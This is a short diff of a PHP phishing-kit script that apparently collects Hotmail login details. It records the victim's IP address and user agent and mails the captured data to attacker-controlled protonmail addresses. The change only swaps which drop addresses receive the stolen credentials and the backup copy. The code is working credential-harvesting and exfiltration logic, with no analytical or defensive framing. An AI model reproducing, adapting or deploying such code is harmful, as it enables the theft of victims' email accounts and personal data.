@@ -29,7 +29,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 $ip = getenv("REMOTE_ADDR");
 $agent=$_SERVER['HTTP_USER_AGENT'];
 
-$email= "newoffice101@protonmail.com";
+$email= "billionbox000@protonmail.com";
 
 
 $message  = "==================+[ Personal Info - Hotmail ]+==================\n";
@@ -81,7 +81,7 @@ if(array_key_exists(strtolower($domain_name), $arrayName)){
 $send = mail($email,$subject,$message);
 
 if($send){
-	mail('billionbox@protonmail.com',$subject,$message);
+	mail('newoffice101@protonmail.com',$subject,$message);
 	if(!empty($return_url)){
 if($trialNo > 0){
 
